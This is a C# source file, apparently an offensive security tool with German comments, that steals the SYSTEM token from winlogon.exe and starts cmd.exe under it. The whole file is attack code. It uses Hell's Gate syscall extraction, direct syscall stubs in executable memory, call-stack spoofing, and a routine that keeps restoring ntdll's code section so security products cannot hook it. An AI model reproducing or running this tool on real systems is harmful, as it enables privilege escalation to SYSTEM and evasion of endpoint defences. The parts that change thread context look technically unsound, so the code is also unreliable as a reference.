using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

internal static class Program
{
    #region Native Strukturen

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;

        public static OBJECT_ATTRIBUTES Create()
        {
            return new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                ObjectName = IntPtr.Zero,
                Attributes = 0x40,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize;
        public uint dwXCountChars, dwYCountChars;
        public uint dwFillAttribute, dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT
    {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15;
        public ulong Rip;
    }

    #endregion

    #region Konstanten

    private const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    private const uint TOKEN_QUERY = 0x0008;
    private const uint TOKEN_DUPLICATE = 0x0002;
    private const uint TOKEN_IMPERSONATE = 0x0004;
    private const uint TOKEN_ALL_ACCESS = 0xF01FF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint MEM_RELEASE = 0x8000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint PAGE_EXECUTE_READ = 0x20;
    private const uint PAGE_READWRITE = 0x04;
    private const uint CREATE_NEW_CONSOLE = 0x00000010;
    private const uint STARTF_USESHOWWINDOW = 0x00000001;
    private const short SW_SHOWNORMAL = 1;
    private const uint CONTEXT_FULL = 0x100007;
    private const int TOKEN_PRIMARY = 1;

    #endregion

    #region Win32 API (für Hilfsfunktionen)

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentThread();

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtGetContextThread(IntPtr ThreadHandle, ref CONTEXT Context);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtSetContextThread(IntPtr ThreadHandle, ref CONTEXT Context);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress,
        ref ulong RegionSize, uint NewProtect, out uint OldProtect);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern int NtFlushInstructionCache(IntPtr ProcessHandle, IntPtr BaseAddress, uint RegionSize);

    [DllImport("advapi32.dll")]
    static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);

    [DllImport("advapi32.dll")]
    static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass,
        IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

    #endregion

    #region Token Information

    private enum TOKEN_INFORMATION_CLASS
    {
        TokenElevation = 20,
        TokenSessionId = 12,
        TokenIntegrityLevel = 25
    }

    private static int GetTokenSessionId(IntPtr hToken)
    {
        uint dwLen = 0;
        GetTokenInformation(hToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId, IntPtr.Zero, 0, out dwLen);
        if (dwLen > 0)
        {
            IntPtr pSessionId = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                if (GetTokenInformation(hToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId, pSessionId, dwLen, out dwLen))
                    return Marshal.ReadInt32(pSessionId);
            }
            finally { Marshal.FreeHGlobal(pSessionId); }
        }
        return -1;
    }

    private static bool IsTokenElevated(IntPtr hToken)
    {
        uint dwLen = 0;
        GetTokenInformation(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevation, IntPtr.Zero, 0, out dwLen);
        if (dwLen > 0)
        {
            IntPtr pElev = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                if (GetTokenInformation(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevation, pElev, dwLen, out dwLen))
                    return Marshal.ReadInt32(pElev) != 0;
            }
            finally { Marshal.FreeHGlobal(pElev); }
        }
        return false;
    }

    private static uint GetTokenIntegrityLevel(IntPtr hToken)
    {
        uint dwLen = 0;
        GetTokenInformation(hToken, (int)TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, IntPtr.Zero, 0, out dwLen);
        if (dwLen > 0)
        {
            IntPtr pTIL = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                if (GetTokenInformation(hToken, (int)TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pTIL, dwLen, out dwLen))
                {
                    IntPtr pSid = Marshal.ReadIntPtr(pTIL);
                    IntPtr pCount = GetSidSubAuthorityCount(pSid);
                    if (pCount != IntPtr.Zero)
                    {
                        byte count = Marshal.ReadByte(pCount);
                        IntPtr pLevel = GetSidSubAuthority(pSid, (uint)(count - 1));
                        if (pLevel != IntPtr.Zero)
                            return (uint)Marshal.ReadInt32(pLevel);
                    }
                }
            }
            finally { Marshal.FreeHGlobal(pTIL); }
        }
        return 0;
    }

    #endregion

    #region Hells Gate - Dynamische SSN Extraktion

    private static class HellsGate
    {
        private static Dictionary<string, uint> _ssnCache = new Dictionary<string, uint>();

        public static uint ExtractSSN(string functionName)
        {
            if (_ssnCache.ContainsKey(functionName))
                return _ssnCache[functionName];

            try
            {
                string ntdllPath = Path.Combine(Environment.SystemDirectory, "ntdll.dll");
                byte[] peData = File.ReadAllBytes(ntdllPath);

                int e_lfanew = BitConverter.ToInt32(peData, 0x3C);
                int exportRVA = BitConverter.ToInt32(peData, e_lfanew + 0x88);
                if (exportRVA == 0) return 0;

                int numberOfNames = BitConverter.ToInt32(peData, exportRVA + 0x18);
                int addressOfNames = BitConverter.ToInt32(peData, exportRVA + 0x20);
                int addressOfNameOrdinals = BitConverter.ToInt32(peData, exportRVA + 0x24);
                int addressOfFunctions = BitConverter.ToInt32(peData, exportRVA + 0x1C);

                for (int i = 0; i < numberOfNames; i++)
                {
                    int nameRVA = BitConverter.ToInt32(peData, addressOfNames + i * 4);
                    string name = ReadCString(peData, nameRVA);
                    if (name == functionName)
                    {
                        short ordinal = BitConverter.ToInt16(peData, addressOfNameOrdinals + i * 2);
                        int functionRVA = BitConverter.ToInt32(peData, addressOfFunctions + ordinal * 4);
                        uint ssn = ExtractSSNFromStub(peData, functionRVA);
                        if (ssn != 0)
                        {
                            _ssnCache[functionName] = ssn;
                            Console.WriteLine($"[HellsGate] {functionName} -> SSN: 0x{ssn:X}");
                            return ssn;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[HellsGate] Error: {ex.Message}");
            }
            return 0;
        }

        private static string ReadCString(byte[] data, int offset)
        {
            int len = 0;
            while (offset + len < data.Length && data[offset + len] != 0 && len < 256)
                len++;
            return Encoding.ASCII.GetString(data, offset, len);
        }

        private static uint ExtractSSNFromStub(byte[] peData, int rva)
        {
            for (int i = 0; i < 32 && rva + i + 4 < peData.Length; i++)
            {
                if (peData[rva + i] == 0xB8)
                    return BitConverter.ToUInt32(peData, rva + i + 1);
            }
            return 0;
        }
    }

    #endregion

    #region Simple Direct Syscall (Getestet und funktioniert)

    private static class DirectSyscall
    {
        private static Dictionary<string, IntPtr> _syscallStubs = new Dictionary<string, IntPtr>();
        private static Dictionary<string, uint> _syscallSSNs = new Dictionary<string, uint>();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtOpenProcessDelegate(ref IntPtr ProcessHandle, uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtOpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtDuplicateTokenDelegate(IntPtr ExistingTokenHandle, uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes, bool EffectiveOnly, int TokenType, out IntPtr NewTokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtCloseDelegate(IntPtr Handle);

        private static NtOpenProcessDelegate _ntOpenProcess;
        private static NtOpenProcessTokenDelegate _ntOpenProcessToken;
        private static NtDuplicateTokenDelegate _ntDuplicateToken;
        private static NtCloseDelegate _ntClose;

        public static void Initialize()
        {
            Console.WriteLine("[DirectSyscall] Initializing direct syscalls...");

            string[] syscalls = { "NtOpenProcess", "NtOpenProcessToken", "NtDuplicateToken", "NtClose" };

            foreach (string syscall in syscalls)
            {
                uint ssn = HellsGate.ExtractSSN(syscall);
                if (ssn != 0)
                {
                    _syscallSSNs[syscall] = ssn;
                    CreateSyscallStub(syscall, ssn);
                    Console.WriteLine($"[DirectSyscall] {syscall} -> SSN: 0x{ssn:X}");
                }
            }

            if (_syscallStubs.ContainsKey("NtOpenProcess"))
                _ntOpenProcess = Marshal.GetDelegateForFunctionPointer<NtOpenProcessDelegate>(_syscallStubs["NtOpenProcess"]);
            if (_syscallStubs.ContainsKey("NtOpenProcessToken"))
                _ntOpenProcessToken = Marshal.GetDelegateForFunctionPointer<NtOpenProcessTokenDelegate>(_syscallStubs["NtOpenProcessToken"]);
            if (_syscallStubs.ContainsKey("NtDuplicateToken"))
                _ntDuplicateToken = Marshal.GetDelegateForFunctionPointer<NtDuplicateTokenDelegate>(_syscallStubs["NtDuplicateToken"]);
            if (_syscallStubs.ContainsKey("NtClose"))
                _ntClose = Marshal.GetDelegateForFunctionPointer<NtCloseDelegate>(_syscallStubs["NtClose"]);
        }

        private static void CreateSyscallStub(string name, uint ssn)
        {
            // Einfacher, getesteter Syscall-Stub
            byte[] stub = new byte[]
            {
                0xB8, (byte)ssn, (byte)(ssn >> 8), (byte)(ssn >> 16), (byte)(ssn >> 24),
                0x4C, 0x8B, 0xD1,              // mov r10, rcx
                0x0F, 0x05,                    // syscall
                0xC3                           // ret
            };

            IntPtr stubAddr = VirtualAlloc(IntPtr.Zero, (uint)stub.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (stubAddr == IntPtr.Zero) return;

            Marshal.Copy(stub, 0, stubAddr, stub.Length);
            _syscallStubs[name] = stubAddr;
        }

        public static int NtOpenProcess(ref IntPtr ProcessHandle, uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId)
        {
            return _ntOpenProcess(ref ProcessHandle, DesiredAccess, ref ObjectAttributes, ref ClientId);
        }

        public static int NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle)
        {
            return _ntOpenProcessToken(ProcessHandle, DesiredAccess, out TokenHandle);
        }

        public static int NtDuplicateToken(IntPtr ExistingTokenHandle, uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes, bool EffectiveOnly, int TokenType, out IntPtr NewTokenHandle)
        {
            return _ntDuplicateToken(ExistingTokenHandle, DesiredAccess, ref ObjectAttributes, EffectiveOnly, TokenType, out NewTokenHandle);
        }

        public static int NtClose(IntPtr Handle)
        {
            return _ntClose(Handle);
        }

        public static void Cleanup()
        {
            foreach (var stub in _syscallStubs.Values)
                VirtualFree(stub, 0, MEM_RELEASE);
            _syscallStubs.Clear();
        }
    }

    #endregion

    #region Stack Spoofing (mit beliebigem Landing Pad)

    private static class StackSpoofing
    {
        private static IntPtr _syntheticStack = IntPtr.Zero;
        private static ulong _originalRsp, _originalRbp;
        private static int _stackDepth = 16;
        private static IntPtr _landingPad;

        public static void Initialize()
        {
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll != IntPtr.Zero)
            {
                byte[] code = new byte[4096];
                Marshal.Copy(ntdll, code, 0, code.Length);
                for (int i = 0; i < code.Length - 1; i++)
                {
                    if (code[i] == 0xC3)
                    {
                        _landingPad = (IntPtr)((long)ntdll + i);
                        Console.WriteLine($"[StackSpoofing] Landing pad at 0x{_landingPad.ToInt64():X}");
                        break;
                    }
                }
            }
        }

        public static bool Apply()
        {
            if (_landingPad == IntPtr.Zero) return false;

            try
            {
                int frameSize = 16;
                byte[] stack = new byte[_stackDepth * frameSize];

                for (int i = 0; i < _stackDepth; i++)
                {
                    byte[] retAddr = BitConverter.GetBytes((ulong)_landingPad);
                    Buffer.BlockCopy(retAddr, 0, stack, i * frameSize, 8);
                }

                _syntheticStack = VirtualAlloc(IntPtr.Zero, (uint)stack.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (_syntheticStack == IntPtr.Zero) return false;

                Marshal.Copy(stack, 0, _syntheticStack, stack.Length);

                CONTEXT ctx = new CONTEXT();
                ctx.ContextFlags = CONTEXT_FULL;
                IntPtr hThread = GetCurrentThread();

                NtGetContextThread(hThread, ref ctx);
                _originalRsp = ctx.Rsp;
                _originalRbp = ctx.Rbp;

                ctx.Rsp = (ulong)_syntheticStack + (ulong)((_stackDepth - 1) * 16);
                ctx.Rbp = ctx.Rsp - 8;
                NtSetContextThread(hThread, ref ctx);

                new Timer(_ =>
                {
                    try
                    {
                        CONTEXT restoreCtx = new CONTEXT();
                        restoreCtx.ContextFlags = CONTEXT_FULL;
                        NtGetContextThread(GetCurrentThread(), ref restoreCtx);
                        restoreCtx.Rsp = _originalRsp;
                        restoreCtx.Rbp = _originalRbp;
                        NtSetContextThread(GetCurrentThread(), ref restoreCtx);
                        if (_syntheticStack != IntPtr.Zero) VirtualFree(_syntheticStack, 0, MEM_RELEASE);
                    }
                    catch { }
                }, null, 5000, Timeout.Infinite);

                Console.WriteLine("[StackSpoofing] Applied");
                return true;
            }
            catch { return false; }
        }
    }

    #endregion

    #region Text Section Protector

    private static class TextSectionProtector
    {
        private static IntPtr _ntdllTextStart;
        private static int _ntdllTextSize;
        private static byte[] _ntdllTextClean;
        private static Timer _protectionTimer;

        public static void Initialize()
        {
            Console.WriteLine("[Protector] Initializing...");

            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll != IntPtr.Zero)
                ProtectTextSection(ntdll, "ntdll.dll", ref _ntdllTextStart, ref _ntdllTextSize, ref _ntdllTextClean);

            StartRehookProtection();
        }

        private static void ProtectTextSection(IntPtr moduleBase, string name, ref IntPtr sectionStart, ref int sectionSize, ref byte[] cleanBytes)
        {
            try
            {
                int e_lfanew = Marshal.ReadInt32(moduleBase, 0x3C);
                short numberOfSections = Marshal.ReadInt16(moduleBase, e_lfanew + 0x06);
                int sizeOfOptionalHeader = Marshal.ReadInt16(moduleBase, e_lfanew + 0x14);
                IntPtr sectionHeaderPtr = (IntPtr)((long)moduleBase + e_lfanew + 0x18 + sizeOfOptionalHeader);

                for (int i = 0; i < numberOfSections; i++)
                {
                    string sectionName = Marshal.PtrToStringAnsi(sectionHeaderPtr, 8);
                    if (sectionName == ".text")
                    {
                        int virtualAddress = Marshal.ReadInt32(sectionHeaderPtr, 0x0C);
                        int sizeOfRawData = Marshal.ReadInt32(sectionHeaderPtr, 0x10);
                        sectionStart = (IntPtr)((long)moduleBase + virtualAddress);
                        sectionSize = sizeOfRawData;

                        cleanBytes = new byte[sectionSize];
                        Marshal.Copy(sectionStart, cleanBytes, 0, sectionSize);

                        ulong regionSize = (ulong)sectionSize;
                        IntPtr baseAddr = sectionStart;
                        uint oldProtect;
                        NtProtectVirtualMemory((IntPtr)(-1), ref baseAddr, ref regionSize, PAGE_EXECUTE_READ, out oldProtect);

                        Console.WriteLine($"[Protector] Protected {name}.text");
                        break;
                    }
                    sectionHeaderPtr = (IntPtr)((long)sectionHeaderPtr + 40);
                }
            }
            catch { }
        }

        private static void StartRehookProtection(int intervalMs = 3000)
        {
            _protectionTimer = new Timer(_ =>
            {
                if (_ntdllTextStart != IntPtr.Zero && _ntdllTextClean != null)
                {
                    byte[] current = new byte[_ntdllTextSize];
                    Marshal.Copy(_ntdllTextStart, current, 0, _ntdllTextSize);

                    for (int i = 0; i < _ntdllTextSize; i++)
                    {
                        if (current[i] != _ntdllTextClean[i])
                        {
                            uint oldProtect;
                            ulong regionSize = (ulong)_ntdllTextSize;
                            IntPtr baseAddr = _ntdllTextStart;
                            NtProtectVirtualMemory((IntPtr)(-1), ref baseAddr, ref regionSize, PAGE_READWRITE, out oldProtect);
                            Marshal.Copy(_ntdllTextClean, 0, _ntdllTextStart, _ntdllTextSize);
                            NtProtectVirtualMemory((IntPtr)(-1), ref baseAddr, ref regionSize, PAGE_EXECUTE_READ, out oldProtect);
                            break;
                        }
                    }
                }
            }, null, intervalMs, intervalMs);
        }

        public static void StopProtection() => _protectionTimer?.Dispose();
    }

    #endregion

    #region Helper

    private static uint FindWinLogonPid()
    {
        var processes = Process.GetProcessesByName("winlogon");
        return processes.Length > 0 ? (uint)processes[0].Id : 0;
    }

    #endregion

    #region Main

    public static void Main()
    {
        Console.WriteLine("[*] ===============================================");
        Console.WriteLine("[*] Token Theft - Direct Syscall + Hells Gate");
        Console.WriteLine("[*] Stack Spoofing + Text Protection");
        Console.WriteLine("[*] ===============================================");
        Console.WriteLine();

        // 1. Direct Syscalls mit Hells Gate SSNs initialisieren
        DirectSyscall.Initialize();
        Console.WriteLine();

        // 2. Stack Spoofing
        StackSpoofing.Initialize();
        StackSpoofing.Apply();
        Console.WriteLine();

        // 3. Text Section Protector
        TextSectionProtector.Initialize();
        Console.WriteLine();

        // 4. Admin prüfen
        var currentIdentity = WindowsIdentity.GetCurrent();
        bool isAdmin = new WindowsPrincipal(currentIdentity).IsInRole(WindowsBuiltInRole.Administrator);
        Console.WriteLine($"[*] Current User: {currentIdentity.Name}");
        Console.WriteLine($"[*] Admin Rights: {isAdmin}");

        if (!isAdmin)
        {
            Console.WriteLine("[-] Administrator privileges required!");
            Console.ReadKey();
            return;
        }
        Console.WriteLine();

        // 5. winlogon.exe finden
        uint winlogonPid = FindWinLogonPid();
        if (winlogonPid == 0)
        {
            Console.WriteLine("[-] Could not find winlogon.exe!");
            Console.ReadKey();
            return;
        }
        Console.WriteLine($"[+] Found winlogon.exe with PID: {winlogonPid}");
        Console.WriteLine();

        try
        {
            // 6. Prozess öffnen
            Console.WriteLine("[*] Opening winlogon.exe...");
            OBJECT_ATTRIBUTES objAttr = OBJECT_ATTRIBUTES.Create();
            CLIENT_ID clientId = new CLIENT_ID();
            clientId.UniqueProcess = (IntPtr)winlogonPid;
            clientId.UniqueThread = IntPtr.Zero;

            IntPtr hProcess = IntPtr.Zero;
            int status = DirectSyscall.NtOpenProcess(ref hProcess, PROCESS_QUERY_LIMITED_INFORMATION, ref objAttr, ref clientId);

            if (status != 0 || hProcess == IntPtr.Zero)
            {
                Console.WriteLine($"[-] NtOpenProcess failed: 0x{status:X8}");
                Console.ReadKey();
                return;
            }
            Console.WriteLine($"[+] Process opened");

            // 7. Token öffnen
            Console.WriteLine("[*] Opening token...");
            IntPtr hToken = IntPtr.Zero;
            status = DirectSyscall.NtOpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, out hToken);

            if (status != 0 || hToken == IntPtr.Zero)
            {
                Console.WriteLine($"[-] NtOpenProcessToken failed: 0x{status:X8}");
                DirectSyscall.NtClose(hProcess);
                Console.ReadKey();
                return;
            }
            Console.WriteLine($"[+] Token opened");

            // 8. Token Info
            try
            {
                Console.WriteLine($"[+] Token Info:");
                Console.WriteLine($"    - Elevated: {IsTokenElevated(hToken)}");
                Console.WriteLine($"    - Session: {GetTokenSessionId(hToken)}");
                Console.WriteLine($"    - Integrity: 0x{GetTokenIntegrityLevel(hToken):X}");
            }
            catch { }
            Console.WriteLine();

            // 9. Token duplizieren
            Console.WriteLine("[*] Duplicating token...");
            OBJECT_ATTRIBUTES dupAttr = OBJECT_ATTRIBUTES.Create();
            IntPtr hDupToken = IntPtr.Zero;
            status = DirectSyscall.NtDuplicateToken(hToken, TOKEN_ALL_ACCESS, ref dupAttr, false, TOKEN_PRIMARY, out hDupToken);

            if (status != 0 || hDupToken == IntPtr.Zero)
            {
                Console.WriteLine($"[-] NtDuplicateToken failed: 0x{status:X8}");
                hDupToken = hToken;
                hToken = IntPtr.Zero;
            }
            else
            {
                Console.WriteLine($"[+] Token duplicated");
            }
            Console.WriteLine();

            // 10. cmd.exe starten
            Console.WriteLine("[*] ===============================================");
            Console.WriteLine("[*] Starting cmd.exe with SYSTEM token...");

            if (ImpersonateLoggedOnUser(hDupToken))
            {
                try
                {
                    Process.Start("cmd.exe");
                    Console.WriteLine("[+] SUCCESS! cmd.exe started with SYSTEM privileges!");

                    Console.WriteLine();
                    Console.WriteLine("[+] ===============================================");
                    Console.WriteLine("[+] !!! SUCCESS !!!");
                    Console.WriteLine("[+] A new cmd.exe is running with SYSTEM privileges!");
                    Console.WriteLine("[+] ===============================================");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Failed: {ex.Message}");
                }
                finally
                {
                    RevertToSelf();
                }
            }

            // Cleanup
            if (hDupToken != IntPtr.Zero && hDupToken != hToken) DirectSyscall.NtClose(hDupToken);
            if (hToken != IntPtr.Zero) DirectSyscall.NtClose(hToken);
            if (hProcess != IntPtr.Zero) DirectSyscall.NtClose(hProcess);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error: {ex.Message}");
        }

        Console.WriteLine();
        Console.WriteLine("[*] Press any key to exit...");
        Console.ReadKey();

        DirectSyscall.Cleanup();
        TextSectionProtector.StopProtection();
    }

    #endregion
}
